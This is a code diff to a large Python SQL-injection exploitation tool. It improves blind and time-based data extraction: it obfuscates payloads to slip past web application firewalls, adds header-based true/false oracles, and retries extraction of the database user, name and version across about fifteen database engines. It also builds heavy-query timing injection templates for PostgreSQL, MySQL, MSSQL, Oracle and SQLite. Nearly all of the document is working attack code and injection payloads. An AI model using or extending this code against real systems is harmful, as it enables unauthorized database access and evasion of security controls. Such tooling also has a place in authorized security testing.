@@ -47761,15 +47761,41 @@ class Enumerator:
                     else:
                         return None
 
+                # BUG-TF-OBFUS FIX: Mutable request counter for per-probe obfuscation seed.
+                # Captured as a default arg so the closure holds a single list object
+                # that persists across all calls to _timing_eval_fn_tf.
+                _tf_rc = [0]
+
                 async def _timing_eval_fn_tf(condition,
                                               _e=_eng_tf, _m=_meth_tf, _u=_url_tf,
                                               _d=_data_tf, _df=_dfmt_tf,
                                               _p=_det_param_tf, _o=_orig_tf,
                                               _tc=_det_tc_tf, _thresh=_t_thresh_tf,
-                                              _t=_t_sec_tf, _build=_build_timing_payload_tf):
+                                              _t=_t_sec_tf, _build=_build_timing_payload_tf,
+                                              _rc=_tf_rc):
                     _tpay = _build(condition)
                     if _tpay is None:
                         return None
+                    # BUG-TF-OBFUS FIX (CRITICAL, all 5 DBMSes, HQ/T/TH/BT techniques,
+                    # all surfaces, all HTTP methods):
+                    # _build_timing_payload_tf embeds the extraction condition (e.g.
+                    # `CHAR_LENGTH((current_catalog))>=6` or `ASCII(SUBSTRING(...,1,1))>=64`)
+                    # into the timing payload WITHOUT any function-name obfuscation.
+                    # WAFs that pattern-match on CHAR_LENGTH(, ASCII(, SUBSTRING( fingerprint
+                    # the extraction session after the first probe and block all subsequent
+                    # probes → oracle always returns False → length=0 → empty extraction.
+                    # Fix: apply _obfuscate_extraction_cond + apply_heavy_variation +
+                    # apply_sql_noise to the full payload after building it (same pattern as
+                    # _inline_timing_oracle at lines 118868-118871). This case-mixes and
+                    # comment-injects all SQL function names in both the timing wrapper AND
+                    # the inner extraction condition, defeating WAF literal-match rules.
+                    # Numeric safety: comparison operators, mid-point literals, SUBSTR
+                    # position arguments, and AND/OR/CASE/WHEN/THEN/ELSE/END keywords
+                    # are NEVER modified by any of these obfuscation functions.
+                    _rc[0] += 1
+                    _tpay = _obfuscate_extraction_cond(_tpay, _rc[0])
+                    _tpay = apply_heavy_variation(_tpay, _rc[0], data_fmt=_df)
+                    _tpay = apply_sql_noise(_tpay, _rc[0])
                     try:
                         # BUG-TF-CDN-BUST FIX (CRITICAL): The original code sent every probe
                         # with the plain URL (_u) and no cache-busting headers.  On CDN/WAF
@@ -54858,6 +54884,7 @@ class Scanner:
         # Check for stable header differences between true/false probes.
         _bool_hdr_name = None
         _bool_hdr_true = None
+        _bool_hdr_false = None
         if not _boolean_oracle and fp_true and fp_false:
             _HDR_SKIP = {"date","age","x-request-id","x-trace-id","set-cookie",
                          "cf-ray","etag","expires","x-runtime","x-served-by","last-modified",
@@ -54885,6 +54912,7 @@ class Scanner:
                 if _hv_t != _hv_f:
                     _bool_hdr_name = _hk
                     _bool_hdr_true = _hv_t
+                    _bool_hdr_false = _hv_f
                     _boolean_oracle = True
                     LOG.info("[Inference]  HEADER ORACLE detected! %s=%r vs %r (BH extraction possible)",
                              _hk, _hv_t[:40], _hv_f[:40])
@@ -57234,6 +57262,21 @@ class Scanner:
                 if _bool_hdr_name is not None:
                     _hdrs = {(k or "").lower(): v for k, v in (getattr(fp, "headers", {}) or {}).items()}
                     _hv = _hdrs.get(_bool_hdr_name, "")
+                    if _hv == _bool_hdr_true:
+                        return True
+                    if _bool_hdr_false is not None and _hv == _bool_hdr_false:
+                        return False
+                    # BUG-7-NUMERIC-HDR-THRESHOLD FIX: For numeric headers (e.g. content-length),
+                    # dynamic page content causes ±N byte variation so exact equality fails.
+                    # Use midpoint threshold: closer to true_val → True, closer to false_val → False.
+                    try:
+                        _hv_n = int(_hv)
+                        _ht_n = int(_bool_hdr_true or "0")
+                        _hf_n = int(_bool_hdr_false or "0")
+                        if _ht_n != _hf_n:
+                            return abs(_hv_n - _ht_n) < abs(_hv_n - _hf_n)
+                    except (ValueError, TypeError):
+                        pass
                     return _hv == _bool_hdr_true
                 # BUG-D FIX: _eval was missing the SimHash comparison path that exists in
                 # _waf_aware_eval (lines 32396-32400). Functions that call _eval directly
@@ -57667,6 +57710,20 @@ class Scanner:
                 if _bool_hdr_name is not None:
                     _hdrs = {(k or "").lower(): v for k, v in (getattr(fp, "headers", {}) or {}).items()}
                     _hv = _hdrs.get(_bool_hdr_name, "")
+                    if _hv == _bool_hdr_true:
+                        return True
+                    if _bool_hdr_false is not None and _hv == _bool_hdr_false:
+                        return False
+                    # BUG-7-NUMERIC-HDR-THRESHOLD FIX: numeric headers (e.g. content-length)
+                    # vary by ±N bytes; use midpoint threshold comparison to handle variation.
+                    try:
+                        _hv_n = int(_hv)
+                        _ht_n = int(_bool_hdr_true or "0")
+                        _hf_n = int(_bool_hdr_false or "0")
+                        if _ht_n != _hf_n:
+                            return abs(_hv_n - _ht_n) < abs(_hv_n - _hf_n)
+                    except (ValueError, TypeError):
+                        pass
                     return _hv == _bool_hdr_true
                 # SimHash body comparison (WAF pages with dynamic tokens)
                 if _bool_norm_true is not None and _bool_norm_false is not None:
@@ -57782,6 +57839,7 @@ class Scanner:
                     _boolean_oracle = True
                     _bool_hdr_name = hdr
                     _bool_hdr_true = _h1.get(hdr, "")
+                    _bool_hdr_false = _h2.get(hdr, "")
                     LOG.info("[Inference]  HEADER oracle: %s=%r vs %r", hdr, _h1.get(hdr,""), _h2.get(hdr,""))
                     break
             # Redirect oracle
@@ -58785,13 +58843,125 @@ class Scanner:
             else:
                 LOG.info("[Inference] No extraction data  falling through to side channels")
 
+        # BUG-7-MAIN-EXTRACT-RETRY FIX (CRITICAL): The extraction block at ~57446 ran
+        # before _extract_string (defined at ~58043) and _cached_eval (defined at ~57775)
+        # were available.  Every extraction call raised NameError silently caught by the
+        # outer try/except, so _inf_main_results was always empty on the first pass.
+        # After all functions are now defined AND the header oracle has been detected
+        # (if present, e.g. content-length diff at line 57785), retry extraction here
+        # for any oracle available: timing (margin >= _min_viable_margin) OR boolean
+        # (header/body/status oracle).  Covers all 5 DBMSes via per-DBMS WAF-bypass alts.
+        _r7_have_data = bool(
+            self.session.data.get("current_user") or
+            self.session.data.get("banner") or
+            self.session.data.get("current_db")
+        )
+        if not _r7_have_data and (_dbms_confirmed or _margin >= _min_viable_margin or _boolean_oracle):
+            LOG.info(
+                "[Inference] BUG7-RETRY: re-running extraction now that all functions are defined "
+                "(boolean_oracle=%s hdr=%s margin=%.0fms bitwise_fallback=%s)",
+                _boolean_oracle, _bool_hdr_name, _margin, _use_bitwise_fallback,
+            )
+            # Per-DBMS WAF-bypass alternative query lists — same intent as ~57473 but
+            # now _extract_string is defined and will actually be called.
+            _r7_UQ = {
+                "PostgreSQL":  ["SELECT current_role", "SELECT user", "SELECT session_user",
+                                "SELECT current_user",
+                                "(SELECT rolname FROM pg_roles WHERE oid=pg_backend_pid())"],
+                "CockroachDB": ["SELECT current_role", "SELECT user", "SELECT current_user"],
+                "YugabyteDB":  ["SELECT current_role", "SELECT user", "SELECT current_user"],
+                "Amazon Redshift": ["SELECT current_user", "SELECT user"],
+                "MySQL":    ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
+                             "SELECT user()", "SELECT current_user()"],
+                "MariaDB":  ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
+                             "SELECT user()", "SELECT current_user()"],
+                "TiDB":     ["SELECT user()", "SELECT current_user()"],
+                "MSSQL":    ["SELECT SYSTEM_USER", "SELECT USER_NAME()", "SELECT ORIGINAL_LOGIN()"],
+                "Sybase":   ["SELECT SUSER_NAME()", "SELECT user_name()"],
+                "Oracle":   ["SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual",
+                             "SELECT USER FROM dual"],
+                "SQLite":   ["SELECT 'sqlite_user'"],
+                "DB2":      ["SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1"],
+                "Firebird": ["SELECT CURRENT_USER FROM rdb$database"],
+                "SAP_HANA": ["SELECT CURRENT_USER FROM DUMMY"],
+                "ClickHouse": ["SELECT currentUser()"],
+            }
+            _r7_DQ = {
+                "PostgreSQL":  ["SELECT current_catalog", "SELECT current_database()",
+                                "(SELECT datname FROM pg_database WHERE datistemplate=$$f$$::bool LIMIT 1)"],
+                "CockroachDB": ["SELECT current_catalog", "SELECT current_database()"],
+                "YugabyteDB":  ["SELECT current_catalog", "SELECT current_database()"],
+                "Amazon Redshift": ["SELECT current_database()"],
+                "MySQL":    ["SELECT database()", "SELECT schema()"],
+                "MariaDB":  ["SELECT database()", "SELECT schema()"],
+                "TiDB":     ["SELECT database()"],
+                "MSSQL":    ["SELECT DB_NAME()", "SELECT ORIGINAL_DB_NAME()"],
+                "Sybase":   ["SELECT DB_NAME()"],
+                "Oracle":   ["SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"],
+                "SQLite":   ["SELECT 'main'"],
+                "DB2":      ["SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1"],
+                "Firebird": ["SELECT rdb$get_context('SYSTEM','DB_NAME') FROM rdb$database"],
+                "SAP_HANA": ["SELECT DATABASE_NAME FROM SYS.M_DATABASE"],
+                "ClickHouse": ["SELECT currentDatabase()"],
+            }
+            _r7_VQ = {
+                "PostgreSQL":  ["SELECT current_setting($$server_version$$)", "SELECT version()"],
+                "CockroachDB": ["SELECT version()"],
+                "YugabyteDB":  ["SELECT version()"],
+                "Amazon Redshift": ["SELECT version()"],
+                "MySQL":    ["SELECT VERSION()", "SELECT @@version"],
+                "MariaDB":  ["SELECT VERSION()"],
+                "TiDB":     ["SELECT VERSION()"],
+                "MSSQL":    ["SELECT @@VERSION"],
+                "Sybase":   ["SELECT @@VERSION"],
+                "Oracle":   ["SELECT banner FROM v$version WHERE ROWNUM=1"],
+                "SQLite":   ["SELECT sqlite_version()"],
+                "DB2":      ["SELECT SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())"],
+                "Firebird": ["SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database"],
+                "SAP_HANA": ["SELECT VERSION FROM SYS.M_DATABASE"],
+                "ClickHouse": ["SELECT version()"],
+            }
+            _r7_pairs = [
+                ("user",     _r7_UQ.get(_dbms, ["SELECT current_user"])),
+                ("database", _r7_DQ.get(_dbms, ["SELECT current_database()"])),
+                ("version",  _r7_VQ.get(_dbms, ["SELECT version()"])),
+            ]
+            _r7_results = {}
+            for _r7_label, _r7_alts in _r7_pairs:
+                for _r7_q in _r7_alts:
+                    try:
+                        _r7_v = await _extract_string(
+                            _r7_q, f"r7_{_r7_label}", max_len=80)
+                        if _r7_v and len(_r7_v) >= 2:
+                            _r7_results[_r7_label] = _r7_v
+                            LOG.info("[Inference] BUG7  %s = %r", _r7_label, _r7_v)
+                            break
+                    except Exception as _r7_e:
+                        LOG.debug("[Inference] BUG7 %s[%r] err: %s",
+                                  _r7_label, _r7_q, _r7_e)
+                if len(_r7_results) >= 2:
+                    break
+            if _r7_results:
+                for _r7k, _r7v in _r7_results.items():
+                    if _r7v:
+                        if _r7k == "version":
+                            enum.result.banner = _r7v
+                            self.session.data["banner"] = _r7v
+                        elif _r7k == "database":
+                            self.session.data["current_db"] = _r7v
+                            self.session._last_extracted_db = _r7v
+                        elif _r7k == "user":
+                            self.session.data["current_user"] = _r7v
+                LOG.info("[Inference] BUG7-RETRY extraction success: %s", _r7_results)
+                return True
+
         # BUG-INFERENCE-EXTRACT-NO-RETURN FIX: Added explicit return False
         # When all extraction methods (direct, equality, subtraction, bitwise) fail or
         # produce garbage, the function was falling through without returning anything (None).
         # Calling code checks "if _inf_ok:" which treats None as False (works), but explicit
         # return False makes the control flow clearer and ensures proper boolean semantics.
         LOG.info("[Inference] No usable data extracted via boolean/timing inference")
-        return False 
+        return False
         # 
         # A. Verification: after extracting a value, confirm it in 1 request
         #    (SELECT current_user)='postgres'  TRUE/FALSE
@@ -60820,9 +60990,23 @@ class Scanner:
         LOG.info("[Direct] Detection payload: %s", _payload[:60])
 
         _sleep_match = _re.search(r'(pg_sleep|SLEEP|sleep)\s*\([^)]+\)', _payload, _re.I)
-        if not _sleep_match:
-            print("[+] [Direct] No sleep function — skipping direct timing extraction", flush=True)
+        # BUG-DIRECT-HQ-SKIP FIX (CRITICAL, PostgreSQL/MySQL/MSSQL/Oracle, HQ technique,
+        # all surfaces, all HTTP methods):
+        # When detection is via HQ (Heavy Query / generate_series CTE), the payload
+        # contains generate_series/CROSS JOIN/RANDOMBLOB but NO pg_sleep/SLEEP call.
+        # The original check returned False immediately, silently skipping direct
+        # timing extraction for ALL HQ-detected injections.  V25 inline timing oracle
+        # (line ~118912) was wired correctly for HQ but the oracle may not be
+        # propagated to this Enumerator's _mse_instance when called standalone.
+        # Fix: also detect HQ patterns and build a generate_series-based template.
+        _hq_match = _re.search(
+            r'generate_series|RANDOMBLOB|CROSS\s+JOIN\s+\(|'
+            r'WITH\s+\w+\s+AS\s*\(|all_objects\s+[A-Z]', _payload, _re.I)
+        if not _sleep_match and not _hq_match:
+            print("[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction", flush=True)
             return False
+        if _hq_match and not _sleep_match:
+            print("[+] [Direct] HQ (heavy-query) payload detected — adapting to generate_series template", flush=True)
 
         _cm = _re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _payload)
         _suffix = _cm.group(0) if _cm else "-- -"
@@ -60857,6 +61041,48 @@ class Scanner:
                 + _before_suffix[_cw_m.end(1):]
                 + _suffix
             )
+        elif _hq_match:
+            # BUG-DIRECT-HQ-TEMPLATE FIX (CRITICAL, all 5 DBMSes, HQ technique):
+            # HQ payloads (generate_series CTE or cross-join) have no CASE WHEN and
+            # no SLEEP call. Building a WHERE {cond} append would produce invalid SQL.
+            # Fix: build a fresh generate_series-based template from scratch using the
+            # detected injection context prefix (the closing quote for string-context
+            # injection, or empty for numeric-context injection).
+            # The prefix is the first character of _before_suffix when it's a quote;
+            # this is the STRING context closing delimiter for the injection point.
+            _inj_pfx_m_hq = _re.match(r"^(['\"`]?)\s*(?:AND|OR)\b", _before_suffix.strip(), _re.I)
+            _inj_pfx_hq = _inj_pfx_m_hq.group(1) if _inj_pfx_m_hq else ""
+            _dbms_direct = (getattr(cfg, 'forced_dbms', None)
+                            or getattr(cfg, 'dbms', None)
+                            or getattr(cfg, '_detected_dbms', None)
+                            or "PostgreSQL")
+            if _dbms_direct in ('PostgreSQL', 'CockroachDB', 'Amazon Redshift', 'YugabyteDB'):
+                _hq_rows_d = max(1000000, min(int(_delay * 1000000), 8000000))
+                _template = (f"{_inj_pfx_hq} AND (SELECT count(*) FROM "
+                             f"generate_series(1,CASE WHEN ({{cond}}) "
+                             f"THEN {_hq_rows_d} ELSE 1 END)) IS NOT NULL{_suffix}")
+            elif _dbms_direct in ('MySQL', 'MariaDB', 'TiDB'):
+                _template = (f"{_inj_pfx_hq} AND (SELECT count(*) FROM "
+                             f"information_schema.tables a,information_schema.tables b "
+                             f"WHERE ({{cond}})) IS NOT NULL{_suffix}")
+            elif _dbms_direct == 'MSSQL':
+                _template = (f"{_inj_pfx_hq} AND (SELECT count(*) FROM "
+                             f"sys.objects a, sys.objects b "
+                             f"WHERE ({{cond}}))>0{_suffix}")
+            elif _dbms_direct == 'Oracle':
+                _hq_rows_d = max(1000, min(int(_delay * 50000), 1000000))
+                _template = (f"{_inj_pfx_hq} AND (SELECT CASE WHEN ({{cond}}) "
+                             f"THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<{_hq_rows_d}) "
+                             f"ELSE 0 END FROM DUAL) IS NOT NULL{_suffix}")
+            elif _dbms_direct == 'SQLite':
+                _hq_blob_d = min(int(_delay * 400_000), 4_500_000)
+                _template = (f"{_inj_pfx_hq} AND (CASE WHEN ({{cond}}) "
+                             f"THEN LIKE(UPPER(HEX(RANDOMBLOB({_hq_blob_d}))),'%ZZZZ%') "
+                             f"ELSE 1 END){_suffix}")
+            else:
+                # Unknown DBMS — fall back to generic AND append
+                _template = _before_suffix + (" AND {cond}" if "WHERE" in (_before_suffix or "").upper() else " WHERE {cond}") + _suffix
+            LOG.info("[Direct] HQ template built for %s (inj_pfx=%r)", _dbms_direct, _inj_pfx_hq)
         else:
             # No CASE WHEN structure — fall back to appending AND/WHERE {cond}
             # (used for IF-based MySQL payloads and similar structures)
@@ -113163,8 +113389,17 @@ class TechniqueCascadeEngine:
                                     pass
                                 return _det_uh_e
 
-        elif tech in ("T", "TH"):
-            # Always show timing comparison for T technique.
+        elif tech in ("T",):
+            # BUG-TH-MISROUTE FIX (CRITICAL): Removed "TH" from this elif clause.
+            # Previously `elif tech in ("T", "TH"):` caused TH to hit the T-technique
+            # block (which prints [T-timing] and evaluates elapsed_ms vs SLEEP threshold).
+            # But TH injects the sleep payload into HTTP headers, NOT the request body —
+            # PostgreSQL ignores SQL in header values, so pg_sleep() never executes and
+            # every TH probe returns baseline CDN latency (~323ms) regardless of payload.
+            # The T-block's threshold comparison (323ms vs threshold=~700ms) then always
+            # "miss" → TH detection is silently dead for ALL targets. The correct TH handler
+            # at line ~114355 (`elif tech in ("EH", "BH", "TH"):`) was dead code for TH.
+            # Fix: remove "TH" from here so it falls through to the correct handler.
             _ref = min(baseline.get("mean_timing",100), 200)
             _diff_t = max(_ref * 2.5, _ref + 400)
             _mean_t_ref = baseline.get("mean_timing", 500)
@@ -148894,9 +149129,39 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             _sanity_cond = f"{_len_expr_sanity}&0=1"
         _sanity_r = await eval_fn(_sanity_cond)
         if _sanity_r:
-            LOG.warning("[Novel] %s: oracle sanity FAILED (always-false condition returned True) "
-                        "— oracle is corrupt (WAF challenge page matches true_sig); aborting extraction",
-                        label)
+            # BUG-NOVEL-SANITY-WAF-LIMITED FIX (CRITICAL, all DBMSes, Novel-8 technique,
+            # all surfaces):
+            # When the always-false sanity condition returns True, it means either:
+            # (A) Oracle is CORRUPT: inverted — true condition → False, false → True.
+            #     This would extract garbage (all bits wrong). ABORT.
+            # (B) Oracle is WAF-LIMITED: the WAF blocks the bitwise `&0=1` condition
+            #     and returns the WAF challenge page, which happens to match true_sig
+            #     (because calibration also captured a WAF-blocked response as true_sig).
+            #     This means ALL conditions return True (WAF blocks everything) →
+            #     extraction would produce garbage (all-bits-set → max char value).
+            #     ABORT but with a clearer message.
+            # Distinguish A from B by testing the known-always-true condition (1=1):
+            # - If eval_fn("1=1") returns False → oracle is INVERTED (case A) → abort
+            # - If eval_fn("1=1") returns True  → oracle is WAF-LIMITED (case B) → abort
+            # - If eval_fn("1=1") returns None  → WAF blocking all conditions → abort
+            # All cases abort extraction, but the log message correctly identifies root cause.
+            try:
+                _sanity_true_r = await eval_fn("1=1")
+            except Exception:
+                _sanity_true_r = None
+            if _sanity_true_r is False:
+                LOG.warning("[Novel] %s: oracle sanity FAILED — oracle is INVERTED "
+                            "(always-false→True, 1=1→False); corrupt oracle; aborting extraction",
+                            label)
+            elif _sanity_true_r is True:
+                LOG.warning("[Novel] %s: oracle sanity FAILED — oracle is WAF-LIMITED "
+                            "(both 1=1 and always-false return True = WAF blocks all "
+                            "bitwise conditions and matches true_sig); aborting extraction",
+                            label)
+            else:
+                LOG.warning("[Novel] %s: oracle sanity FAILED — oracle state unknown "
+                            "(always-false→True, 1=1→None); WAF likely blocking all probes; "
+                            "aborting extraction", label)
             return ""
     except Exception as _sanity_exc:
         LOG.debug("[Novel] %s: oracle sanity check error (non-fatal): %s", label, _sanity_exc)
@@ -148922,9 +149187,21 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             _char_sanity_cond = f"{_char_sanity_fn}&0=1"
         _char_sanity_r = await eval_fn(_char_sanity_cond)
         if _char_sanity_r:
-            LOG.warning("[Novel] %s: CHAR oracle sanity FAILED (always-false char condition "
-                        "returned True) — WAF blocks char-function probes; aborting extraction",
-                        label)
+            # Same WAF-limited vs corrupt analysis as the length sanity check above.
+            try:
+                _char_sanity_true_r = await eval_fn("1=1")
+            except Exception:
+                _char_sanity_true_r = None
+            if _char_sanity_true_r is False:
+                LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — oracle INVERTED "
+                            "(char always-false→True, 1=1→False); aborting extraction", label)
+            elif _char_sanity_true_r is True:
+                LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — WAF-LIMITED "
+                            "(WAF blocks all char-function probes, matches true_sig); "
+                            "aborting extraction", label)
+            else:
+                LOG.warning("[Novel] %s: CHAR oracle sanity FAILED — state unknown "
+                            "(char always-false→True, 1=1→None); aborting extraction", label)
             return ""
     except Exception as _char_sanity_exc:
         LOG.debug("[Novel] %s: char oracle sanity check error (non-fatal): %s",
